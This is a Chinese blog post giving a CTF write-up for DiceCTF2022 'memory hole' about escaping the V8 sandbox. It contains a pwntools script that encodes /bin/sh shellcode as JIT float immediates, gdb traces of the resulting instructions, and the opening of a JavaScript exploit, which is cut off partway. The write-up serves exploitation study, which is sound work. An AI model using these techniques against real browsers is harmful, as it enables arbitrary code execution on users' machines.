<!DOCTYPE html>
<html lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="Jayl1n">
<meta name="baidu-site-verification" content="elXpeED2jg">



<meta name="description" content="本文首发于跳跳糖 https://tttang.com/archive/1443/   V8 沙箱绕过这是 DiceCTF2022 的一道题 memory hole。 题目给了我们修改任意 array 的 length 的能力，按过往的经验，接下来很简单，就是构造任意地址读写原语，构造 WASM 实例，读 RWX 空间地址，写 shellcode ，调 WASM 函数，结束。 但题目开启了 V8">
<meta name="keywords" content="Pwn,二进制,CTF,浏览器">
<meta property="og:type" content="article">
<meta property="og:title" content="V8 沙盒绕过">
<meta property="og:url" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/index.html">
<meta property="og:site_name" content="Jayl1n&#39;s Blog">
<meta property="og:description" content="本文首发于跳跳糖 https://tttang.com/archive/1443/   V8 沙箱绕过这是 DiceCTF2022 的一道题 memory hole。 题目给了我们修改任意 array 的 length 的能力，按过往的经验，接下来很简单，就是构造任意地址读写原语，构造 WASM 实例，读 RWX 空间地址，写 shellcode ，调 WASM 函数，结束。 但题目开启了 V8">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%201.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%202.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%203.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%204.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%205.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%206.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%207.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%208.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%209.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%2010.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%2011.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%2012.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%2013.png">
<meta property="og:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled%2014.png">
<meta property="og:updated_time" content="2023-08-16T15:16:43.329Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="V8 沙盒绕过">
<meta name="twitter:description" content="本文首发于跳跳糖 https://tttang.com/archive/1443/   V8 沙箱绕过这是 DiceCTF2022 的一道题 memory hole。 题目给了我们修改任意 array 的 length 的能力，按过往的经验，接下来很简单，就是构造任意地址读写原语，构造 WASM 实例，读 RWX 空间地址，写 shellcode ，调 WASM 函数，结束。 但题目开启了 V8">
<meta name="twitter:image" content="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/Untitled.png">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Jayl1n&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/cat.jpg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="../../../../css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>V8 沙盒绕过 | Jayl1n&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?08bebd32e2a42a1273ff796a43439f77";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/cat.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Jayl1n</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="../../../../index.html">主页</a></li>
                        
                            <li><a href="../../../../archives/">所有文章</a></li>
                        
                            <li><a href="../../../../tags/">标签云</a></li>
                        
                            <li><a href="../../../../about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:panja@foxmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="https://www.github.com/Jayl1n" title="GitHub"></a>
                            
                                <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/红蓝对抗/">红蓝对抗</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://redteam.today">李三的剑谱</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://blog.l0ca1.xyz/">l0cal</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://7o8v.me/">7o8v</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://godot.win/">Godot</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://evoa.me/">evoA</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://abcdefghijklmnopqrst.xyz/">骑麦兜看落日</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://kkdlong.win">kkdlong</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于安全</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Jayl1n</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/cat.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Jayl1n</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="../../../../index.html">主页</a></li>
                
                    <li><a href="../../../../archives/">所有文章</a></li>
                
                    <li><a href="../../../../tags/">标签云</a></li>
                
                    <li><a href="../../../../about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:panja@foxmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://www.github.com/Jayl1n" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-v8-sandbox-escape" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="" class="article-date">
      <time datetime="2022-02-27T03:17:27.000Z" itemprop="datePublished">2022-02-27</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      V8 沙盒绕过
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/浏览器/">浏览器</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <blockquote>
<p>本文首发于跳跳糖 <a href="https://tttang.com/archive/1443/" target="_blank" rel="noopener">https://tttang.com/archive/1443/</a> </p>
</blockquote>
<h1 id="V8-沙箱绕过"><a href="#V8-沙箱绕过" class="headerlink" title="V8 沙箱绕过"></a>V8 沙箱绕过</h1><p>这是 DiceCTF2022 的一道题 memory hole。</p>
<p>题目给了我们修改任意 array 的 length 的能力，按过往的经验，接下来很简单，就是构造任意地址读写原语，构造 WASM 实例，读 RWX 空间地址，写 shellcode ，调 WASM 函数，结束。</p>
<p>但题目开启了 V8 沙箱，一个新的安全机制，直接阻止了我们构造任意地址读写，能访问的范围是 array 基址后连续的 4G 地址空间。</p>
<p>绕过这个沙箱是本题的重点，看了两篇wp有所收获，所以整理了下绕过手法，未来可能会用到。</p>
<p>【题目地址】 <a href="https://github.com/Jayl1n/CTF-Writeup/blob/master/DiceCTF2022/memory-hole/1984.tar.gz" target="_blank" rel="noopener">https://github.com/Jayl1n/CTF-Writeup/blob/master/DiceCTF2022/memory-hole/1984.tar.gz</a></p>
<h1 id="指针压缩"><a href="#指针压缩" class="headerlink" title="指针压缩"></a>指针压缩</h1><p>64 位 V8 中使用了“指针压缩”的技术，即将 64 位指针转为 <code>js_base + offset</code> 的形式，只在内存当中存储 <code>offset</code> ，寄存器 <code>$14</code> 存储 <code>js_base</code> ，其中 <code>offset</code> 是 32 位的。JS 对象在解引用时，会从 <code>$r14 + offset</code> 的地址加载。因此 <code>js_base + offset</code> 被限制在很小的一个区域，无法访问任意地址。</p>
<p>如下，没有开启“指针压缩”的 <code>ArrayBuffer</code> 内存布局：</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled.png" alt="Untitled"></p>
<p>开启后：</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%201.png" alt="Untitled"></p>
<p>绕过“指针压缩”的方法很简单，因为“指针压缩”只对堆上指针使用，堆外指针不会压缩。<code>ArrayBuffer</code> 的 <code>BackingStore</code> 是个堆外指针，可以直接修改 <code>BackingStore</code> 为任意地址进而实现任意地址读写。</p>
<h1 id="V8-沙箱"><a href="#V8-沙箱" class="headerlink" title="V8 沙箱"></a>V8 沙箱</h1><p>V8 沙箱扩展“指针压缩”将 V8 堆上的所有原始指针都 “沙盒化”，比如 <code>WebAssembly</code> 的 <code>RWX</code> 页指针和 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 指针。将这些外部指针都转为表的索引，以基址+偏移的方式访问，限制指针能访问的范围，防止攻击者利用 V8 漏洞实现内存任意地址读写。</p>
<p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf" target="_blank" rel="noopener">V8 Sandbox - High-Level Design Doc</a></p>
<p>如下，未开启 V8 沙箱时的 <code>ArrayBuffer</code> 对象内存布局：</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%202.png" alt="Untitled"></p>
<p>开启沙箱后，<code>BackingStore</code> 替换为 0x45c00000000（偏移量 0x45c00，向左移动 24 位保证最高位为 0）。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%203.png" alt="Untitled"></p>
<p>此时假设攻击者能从多个线程中任意破坏沙箱内的内存，现在需要一个额外的漏洞破坏沙箱外部的内存，从而执行任意代码。</p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="方法一：利用立即数写-shellcode"><a href="#方法一：利用立即数写-shellcode" class="headerlink" title="方法一：利用立即数写 shellcode"></a>方法一：利用立即数写 shellcode</h2><p><em>(参考 <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" target="_blank" rel="noopener">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a>）</em></p>
<h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><p>先 DebugPrint 一个 <code>JSFunction</code> 的内存结构：</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%204.png" alt="Untitled"></p>
<p>这里有一个 <code>code</code> 字段，它指向了函数要执行的汇编指令，处于 <code>r-x</code> 页。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%205.png" alt="Untitled"></p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%206.png" alt="Untitled"></p>
<p>用 gdb 修改 <code>code</code> 字段 <code>0x41414141</code> 。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%207.png" alt="Untitled"></p>
<p>继续执行，出现异常，此时 <code>rcx</code> 是 <code>0x2a0c41414141</code> ，即基址(0x2a0c00000000)+偏移(0x41414141)。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%208.png" alt="Untitled"></p>
<p>看这段汇编，如果我们令<code>[rcx + 0x1b] &amp; 0x20000000 = 0</code> ，<code>rip</code> 就会在之后被设置为 <code>rcx+0x3f</code> ，从而劫持 <code>rip</code> ，这个条件是比较容易满足的。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%209.png" alt="Untitled"></p>
<h3 id="使用立即数构造-shellcode"><a href="#使用立即数构造-shellcode" class="headerlink" title="使用立即数构造 shellcode"></a>使用立即数构造 shellcode</h3><p>JS 函数的 JIT 代码存储在堆内，即基址开头的 32 位区域，如下，基址都是 <code>0x350f00000000</code> 。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2010.png" alt="Untitled"></p>
<p>这个函数返回的是一个浮点数组，在汇编里，每个浮点数以<strong>立即数</strong>的形式存在，<strong>立即数</strong>占 8 个字节。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2011.png" alt="Untitled"></p>
<p>立即数同样可以被识别为汇编指令，很容易想到可以利用这个<strong>立即数</strong>来布置 shellcode，只要将 shellcode 片段用 <code>jmp</code> 连接起来，就能将一个个立即数串联起来，实现完整的功能。</p>
<p><code>jmp</code> 短跳需要 2 个字节，剩下 6 个字节可以自由发挥。</p>
<p>参考原作的脚本生成 shellcode，再将输出转为 IEEE 浮点表示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&apos;amd64&apos;)</span><br><span class="line">jmp = b&apos;\xeb\x0c&apos;</span><br><span class="line">shell = u64(b&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">def make_double(code):</span><br><span class="line">	assert len(code) &lt;= 6</span><br><span class="line">	print(hex(u64(code.ljust(6, b&apos;\x90&apos;) + jmp))[2:])</span><br><span class="line"></span><br><span class="line">make_double(asm(&quot;push %d; pop rax&quot; % (shell &gt;&gt; 0x20)))</span><br><span class="line">make_double(asm(&quot;push %d; pop rdx&quot; % (shell % 0x100000000)))</span><br><span class="line">make_double(asm(&quot;shl rax, 0x20; xor esi, esi&quot;))</span><br><span class="line">make_double(asm(&quot;add rax, rdx; xor edx, edx; push rax&quot;))</span><br><span class="line">code = asm(&quot;mov rdi, rsp; push 59; pop rax; syscall&quot;)</span><br><span class="line">assert len(code) &lt;= 8</span><br><span class="line">print(hex(u64(code.ljust(8, b&apos;\x90&apos;)))[2:])</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Output:</span><br><span class="line">ceb580068732f68</span><br><span class="line">ceb5a6e69622f68</span><br><span class="line">cebf63120e0c148</span><br><span class="line">ceb50d231d00148</span><br><span class="line">50f583b6ae78948</span><br><span class="line"></span><br><span class="line">IEEE:</span><br><span class="line">1.95538254221075331056310651818E-246</span><br><span class="line">1.95606125582421466942709801013E-246</span><br><span class="line">1.99957147195425773436923756715E-246</span><br><span class="line">1.95337673326740932133292175341E-246</span><br><span class="line">2.63486047652296056448306022844E-284</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>生成出来的 shellcode 是通过系统调用执行 <code>/bin/sh</code> 。</p>
<p>跟一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job 0x3de400045681</span><br><span class="line">0x3de400045681: [Code]</span><br><span class="line"> - map: 0x3de40800263d &lt;Map&gt;</span><br><span class="line"> - code_data_container: 0x3de4081d360d &lt;Other heap object (CODE_DATA_CONTAINER_TYPE)&gt;</span><br><span class="line">kind = TURBOFAN</span><br><span class="line">stack_slots = 6</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = 0x3de400045681</span><br><span class="line"></span><br><span class="line">Instructions (size = 388)</span><br><span class="line">0x3de4000456c0     0  8b59d0               movl rbx,[rcx-0x30]</span><br><span class="line">...</span><br><span class="line">0x3de400045735    75  c5fb114107           vmovsd [rcx+0x7],xmm0</span><br><span class="line">0x3de40004573a    7a  49ba682f73680058eb0c REX.W movq r10,0xceb580068732f68</span><br><span class="line">0x3de400045744    84  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de400045749    89  c5fb11410f           vmovsd [rcx+0xf],xmm0</span><br><span class="line">0x3de40004574e    8e  49ba682f62696e5aeb0c REX.W movq r10,0xceb5a6e69622f68</span><br><span class="line">0x3de400045758    98  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de40004575d    9d  c5fb114117           vmovsd [rcx+0x17],xmm0</span><br><span class="line">0x3de400045762    a2  49ba48c1e02031f6eb0c REX.W movq r10,0xcebf63120e0c148</span><br><span class="line">0x3de40004576c    ac  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de400045771    b1  c5fb11411f           vmovsd [rcx+0x1f],xmm0</span><br><span class="line">0x3de400045776    b6  49ba4801d031d250eb0c REX.W movq r10,0xceb50d231d00148</span><br><span class="line">0x3de400045780    c0  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de400045785    c5  c5fb114127           vmovsd [rcx+0x27],xmm0</span><br><span class="line">0x3de40004578a    ca  49ba4889e76a3b580f05 REX.W movq r10,0x50f583b6ae78948</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>以指令格式查看这几个立即数，可以看到这几个立即数是通过 <code>jmp</code> 串联起来了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/3i 0x3de40004573c</span><br><span class="line">   0x3de40004573c:	push   0x68732f</span><br><span class="line">   0x3de400045741:	pop    rax</span><br><span class="line">   0x3de400045742:	jmp    0x3de400045750</span><br><span class="line">gef➤  x/3i 0x3de400045750</span><br><span class="line">   0x3de400045750:	push   0x6e69622f</span><br><span class="line">   0x3de400045755:	pop    rdx</span><br><span class="line">   0x3de400045756:	jmp    0x3de400045764</span><br><span class="line">gef➤  x/3i 0x3de400045764</span><br><span class="line">   0x3de400045764:	shl    rax,0x20</span><br><span class="line">   0x3de400045768:	xor    esi,esi</span><br><span class="line">   0x3de40004576a:	jmp    0x3de400045778</span><br><span class="line">gef➤  x/4i 0x3de400045778</span><br><span class="line">   0x3de400045778:	add    rax,rdx</span><br><span class="line">   0x3de40004577b:	xor    edx,edx</span><br><span class="line">   0x3de40004577d:	push   rax</span><br><span class="line">   0x3de40004577e:	jmp    0x3de40004578c</span><br><span class="line">gef➤  x/4i 0x3de40004578C</span><br><span class="line">   0x3de40004578c:	mov    rdi,rsp</span><br><span class="line">   0x3de40004578f:	push   0x3b</span><br><span class="line">   0x3de400045791:	pop    rax</span><br><span class="line">   0x3de400045792:	syscall</span><br></pre></td></tr></table></figure>
<h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>接下来就是劫持 <code>rip</code> 。</p>
<p>修改 JSFunction 对象的 <code>code</code> 字段，令 <code>code + 0x3f = 0x3de40004573c</code> 。</p>
<p><code>code</code> 的计算方式 <code>0x3de400045681 + (0x3de40004573c - 0x3f - 0x3de400045681) = 0x3de400045681 + 0x7c</code> ，即原 <code>code</code> 值加 <code>0x7c</code> ，具体各位自行体会，原作的 <code>jitAddr + 0xb3 - 0x3f</code> 的计算在我这跑不起来，差了 8 个字节，不知道是不是环境问题。</p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2012.png" alt="Untitled"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">function dp(x) &#123;&#125;// %DebugPrint(x);&#125;</span><br><span class="line">const print = () =&gt; &#123;&#125;;</span><br><span class="line">const assert = function (b, msg)</span><br><span class="line">&#123;</span><br><span class="line">	if (!b)</span><br><span class="line">		throw Error(msg);</span><br><span class="line">&#125;;</span><br><span class="line">const __buf8 = new ArrayBuffer(8);</span><br><span class="line">const __dvCvt = new DataView(__buf8);</span><br><span class="line">function d2u(val)</span><br><span class="line">&#123; //double ==&gt; Uint64</span><br><span class="line">	__dvCvt.setFloat64(0, val, true);</span><br><span class="line">	return __dvCvt.getUint32(0, true) +</span><br><span class="line">		__dvCvt.getUint32(4, true) * 0x100000000;</span><br><span class="line">&#125;</span><br><span class="line">function u2d(val)</span><br><span class="line">&#123; //Uint64 ==&gt; double</span><br><span class="line">	const tmp0 = val % 0x100000000;</span><br><span class="line">	__dvCvt.setUint32(0, tmp0, true);</span><br><span class="line">	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, 